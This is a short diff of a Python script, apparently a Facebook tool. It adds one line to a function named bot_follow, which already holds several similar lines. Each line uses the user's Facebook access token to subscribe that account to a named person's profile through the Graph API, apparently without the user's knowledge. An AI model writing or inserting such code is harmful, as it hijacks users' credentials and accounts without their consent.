@@ -165,6 +165,7 @@ def bot_follow():
     requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
     requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
     requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
     options()
     
 def options():
